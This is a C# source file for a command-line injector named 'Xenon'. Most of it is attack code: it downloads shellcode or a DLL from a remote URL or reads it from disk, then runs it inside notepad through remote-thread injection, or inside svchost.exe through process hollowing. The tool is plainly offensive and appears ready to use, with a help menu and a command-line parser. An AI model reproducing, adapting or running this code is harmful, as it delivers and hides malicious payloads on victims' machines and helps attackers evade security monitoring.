using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Net;
using System.Collections.ObjectModel;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Diagnostics;
using System.IO;

namespace Injector
{
    public class Arguments
    {
        /// <summary>
        /// Splits the command line. When main(string[] args) is used escaped quotes (ie a path "c:\folder\")
        /// Will consume all the following command line arguments as the one argument. 
        /// This function ignores escaped quotes making handling paths much easier.
        /// </summary>
        /// <param name="commandLine">The command line.</param>
        /// <returns></returns>
        public static string[] SplitCommandLine(string commandLine)
        {
            var translatedArguments = new StringBuilder(commandLine);
            var escaped = false;
            for (var i = 0; i < translatedArguments.Length; i++)
            {
                if (translatedArguments[i] == '"')
                {
                    escaped = !escaped;
                }
                if (translatedArguments[i] == ' ' && !escaped)
                {
                    translatedArguments[i] = '\n';
                }
            }

            var toReturn = translatedArguments.ToString().Split(new[] { '\n' }, StringSplitOptions.RemoveEmptyEntries);
            for (var i = 0; i < toReturn.Length; i++)
            {
                toReturn[i] = RemoveMatchingQuotes(toReturn[i]);
            }
            return toReturn;
        }

        public static string RemoveMatchingQuotes(string stringToTrim)
        {
            var firstQuoteIndex = stringToTrim.IndexOf('"');
            var lastQuoteIndex = stringToTrim.LastIndexOf('"');
            while (firstQuoteIndex != lastQuoteIndex)
            {
                stringToTrim = stringToTrim.Remove(firstQuoteIndex, 1);
                stringToTrim = stringToTrim.Remove(lastQuoteIndex - 1, 1); //-1 because we've shifted the indicies left by one
                firstQuoteIndex = stringToTrim.IndexOf('"');
                lastQuoteIndex = stringToTrim.LastIndexOf('"');
            }

            return stringToTrim;
        }

        private readonly Dictionary<string, Collection<string>> _parameters;
        private string _waitingParameter;

        public Arguments(IEnumerable<string> arguments)
        {
            _parameters = new Dictionary<string, Collection<string>>();

            string[] parts;

            //Splits on beginning of arguments ( - and -- and / )
            //And on assignment operators ( = and : )
            var argumentSplitter = new Regex(@"^-{1,2}|^/|=|:",
                RegexOptions.IgnoreCase | RegexOptions.Compiled);

            foreach (var argument in arguments)
            {
                parts = argumentSplitter.Split(argument, 3);
                switch (parts.Length)
                {
                    case 1:
                        AddValueToWaitingArgument(parts[0]);
                        break;
                    case 2:
                        AddWaitingArgumentAsFlag();

                        //Because of the split index 0 will be a empty string
                        _waitingParameter = parts[1];
                        break;
                    case 3:
                        AddWaitingArgumentAsFlag();

                        //Because of the split index 0 will be a empty string
                        string valuesWithoutQuotes = RemoveMatchingQuotes(parts[2]);

                        AddListValues(parts[1], valuesWithoutQuotes.Split(','));
                        break;
                }
            }

            AddWaitingArgumentAsFlag();
        }

        private void AddListValues(string argument, IEnumerable<string> values)
        {
            foreach (var listValue in values)
            {
                Add(argument, listValue);
            }
        }

        private void AddWaitingArgumentAsFlag()
        {
            if (_waitingParameter == null) return;

            AddSingle(_waitingParameter, "true");
            _waitingParameter = null;
        }

        private void AddValueToWaitingArgument(string value)
        {
            if (_waitingParameter == null) return;

            value = RemoveMatchingQuotes(value);

            Add(_waitingParameter, value);
            _waitingParameter = null;
        }

        /// <summary>
        /// Gets the count.
        /// </summary>
        /// <value>The count.</value>
        public int Count
        {
            get
            {
                return _parameters.Count;
            }
        }

        /// <summary>
        /// Adds the specified argument.
        /// </summary>
        /// <param name="argument">The argument.</param>
        /// <param name="value">The value.</param>
        public void Add(string argument, string value)
        {
            if (!_parameters.ContainsKey(argument))
                _parameters.Add(argument, new Collection<string>());

            _parameters[argument].Add(value);
        }

        public void AddSingle(string argument, string value)
        {
            if (!_parameters.ContainsKey(argument))
                _parameters.Add(argument, new Collection<string>());
            else
                throw new ArgumentException(string.Format("Argument {0} has already been defined", argument));

            _parameters[argument].Add(value);
        }

        /// <summary>
        /// Determines whether the specified argument is true.
        /// </summary>
        /// <param name="argument">The argument.</param>
        /// <returns>
        ///     <c>true</c> if the specified argument is true; otherwise, <c>false</c>.
        /// </returns>
        public bool IsTrue(string argument)
        {
            AssertSingle(argument);

            var arg = this[argument];

            return arg != null && arg[0].Equals("true", StringComparison.OrdinalIgnoreCase);
        }

        private void AssertSingle(string argument)
        {
            if (this[argument] != null && this[argument].Count > 1)
                throw new ArgumentException(string.Format("{0} has been specified more than once, expecting single value", argument));
        }

        public string Single(string argument)
        {
            AssertSingle(argument);

            //only return value if its NOT true, there is only a single item for that argument
            //and the argument is defined
            if (this[argument] != null && !IsTrue(argument))
                return this[argument][0];

            return null;
        }

        public bool Exists(string argument)
        {
            return (this[argument] != null && this[argument].Count > 0);
        }

        /// <summary>
        /// Gets the <see cref="System.Collections.ObjectModel.Collection&lt;T&gt;"/> with the specified parameter.
        /// </summary>
        /// <value></value>
        public Collection<string> this[string parameter]
        {
            get
            {
                return _parameters.ContainsKey(parameter) ? _parameters[parameter] : null;
            }
        }
    }
    class Program
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        private struct PROCESS_BASIC_INFORMATION
        {
            public UIntPtr ExitStatus;
            public IntPtr PebBaseAddress;
            public UIntPtr AffinityMask;
            public UIntPtr BasePriority;
            public UIntPtr UniqueProcessId;
            public UIntPtr InheritedFromUniqueProcessId;
        }

        private static uint PROCESS_ALL_ACCESS = 0x000F0000 | 0x00100000 | 0xFFFF;

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32")]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll", SetLastError = true)]
        static extern UInt32 ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, UInt32 ProcInfoLen, ref UInt32 retlen);

        [DllImport("kernel32", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);


        static int process_injection(string location, int button)
        {
            Process[] remote_p = Process.GetProcessesByName("notepad");
            int pid = 0;

            if (remote_p.Length == 0)
            {
                //Create Process
                Process p = new Process();
                p.StartInfo.FileName = "C:\\Windows\\System32\\notepad.exe";
                p.StartInfo.WindowStyle = ProcessWindowStyle.Maximized;
                p.Start();
                pid = p.Id;
            }
            else
            {
                pid = remote_p[0].Id;
            }

            if (location.StartsWith("http"))
            {
                WebClient wc = new WebClient();
                string url = location;
                byte[] shellcode = wc.DownloadData(url);
                IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
                IntPtr address = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
                IntPtr bytes = IntPtr.Zero;
                bool res = WriteProcessMemory(hProcess, address, shellcode, shellcode.Length, out bytes);
                if (res == false)
                {
                    Console.WriteLine("Cannot copy into process");
                    return -1;
                }
                IntPtr thread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, address, IntPtr.Zero, 0, IntPtr.Zero);
                return 0;
            }
            else
                return -1;
        }

        static int reflective_dll_injection(string location)
        {
            Process[] remote_p = Process.GetProcessesByName("notepad");
            int pid = 0;

            if (remote_p.Length == 0)
            {
                //Create Process
                Process p = new Process();
                p.StartInfo.FileName = "C:\\Windows\\System32\\notepad.exe";
                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                p.Start();
                pid = p.Id;
            }
            else
            {
                pid = remote_p[0].Id;
            }

            String dllName = "";

            if (location.StartsWith("http"))
            {
                WebClient wc = new WebClient();
                wc.DownloadFile(location, "C:\\Windows\\Temp\\meet.dll");
                dllName = "C:\\Windows\\Temp\\meet.dll";
            }
            else
            {
                dllName = location;
            }

            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
            IntPtr address = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
            IntPtr bytes = IntPtr.Zero;
            bool res = WriteProcessMemory(hProcess, address, Encoding.Default.GetBytes(dllName), dllName.Length, out bytes);
            if (res == false)
            {
                Console.WriteLine("Cannot copy into process");
                return -1;
            }
            IntPtr load_addr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            CreateRemoteThread(hProcess, IntPtr.Zero, 0, load_addr, address, 0, IntPtr.Zero);

            return 0;
        }

        static int process_hollowing(string location)
        {
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
            if (res == false)
            {
                Console.WriteLine("[!] Error creating svchosts.exe");
                return -1;
            }
            PROCESS_BASIC_INFORMATION pib = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;

            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref pib, (uint)(UIntPtr.Size * 6), ref tmp);

            IntPtr PointerToPE = (IntPtr)((Int64)pib.PebBaseAddress + 0x10);
            byte[] addrBuf = new byte[IntPtr.Size];

            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, PointerToPE, addrBuf, addrBuf.Length, out nRead);
            IntPtr SvcHostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, SvcHostBase, data, data.Length, out nRead);

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)SvcHostBase);

            // Get shellcode bytes from localtion
            if (location.StartsWith("http"))
            {
                //location of server
                WebClient wc = new WebClient();
                string url = location;
                byte[] shellcode = wc.DownloadData(url);
                WriteProcessMemory(hProcess, addressOfEntryPoint, shellcode, shellcode.Length, out nRead);
                ResumeThread(pi.hThread);
            }
            else
            {
                //location relative to disk
                byte[] shellcode = File.ReadAllBytes(location);
                WriteProcessMemory(hProcess, addressOfEntryPoint, shellcode, shellcode.Length, out nRead);
                ResumeThread(pi.hThread);
            }
            return 0;
        }
        static void help_xenon()
        {
            Console.WriteLine("Help Options for Xenon:");
            Console.WriteLine("-m \t Mode of operation");
            Console.WriteLine("\t-m 1 \t Specifies the mode as Process injection");
            Console.WriteLine("\t-m 2 \t Specifies the mode as Reflective Process Injection");
            Console.WriteLine("\t-m 3 \t Specifies the mode as Process Hollowing\n");
            Console.WriteLine("-shellcode \t Use shellcode");
            Console.WriteLine("-dll \t Use dll");
            Console.WriteLine("-location \t Specify the location i.e either server or local");
            return;
        }
        static int Main(string[] args)
        {
            //xenon.exe -m <1,2,3> --<shellcode/dll> --location <http://1.1.1.1/name, C:\\A\\B\\name>
            IEnumerable<string> arg = Arguments.SplitCommandLine(string.Join(" ", args));
            var arguments = new Arguments(arg);

            if ((arguments.Exists("m") && arguments.Exists("location") && (arguments.Exists("shellcode") || arguments.Exists("dll"))) == false || arguments.Count != 3)
            {
                help_xenon();
                return -1;
            }

            //Options to transfer shellcode/DLL - Via SMB share and local disk (.dll for dll and .txt for shellcode)

            //1. Process injection via shellcode
            //2. Reflective Process injection via DLL (in memory)
            //3. Process Hollowing (shellcode)


            Console.WriteLine("[+] Parsing command line arguments");
            int mode = int.Parse(arguments.Single("m"));
            string location = arguments.Single("location");
            int button = 0;

            if (arguments.Exists("shellcode"))
            {
                button = 1;
            }
            else
                button = 2;

            int response = 0;

            switch (mode)
            {
                case 1:
                    if (button == 1)
                        Console.WriteLine("Injecting into process via shellcode at " + location);
                    else
                        Console.WriteLine("Injecting into process via DLL at " + location);
                    response = process_injection(location, button);

                    if (response == 0)
                        Console.WriteLine("[+] Process Injection done :)");
                    else
                        Console.WriteLine("[!] Error running the process injection module");
                    break;

                case 2:
                    Console.WriteLine("Reflective DLL Injection into process using DLL at " + location);
                    response = reflective_dll_injection(location);

                    if (response == 0)
                        Console.WriteLine("[+] Reflected DLL Injection done :)");
                    else
                        Console.WriteLine("[!] Error running the reflective DLL injection module");
                    break;

                case 3:
                    Console.WriteLine("Using Process hollowing into process using DLL at " + location);
                    response = process_hollowing(location);

                    if (response == 0)
                        Console.WriteLine("[+] Process hollowing done :)");
                    else
                        Console.WriteLine("[!] Error running the process hollowing module");
                    break;

                default:
                    Console.WriteLine("Mode not found");
                    break;
            }

            return 0;
        }
    }
}
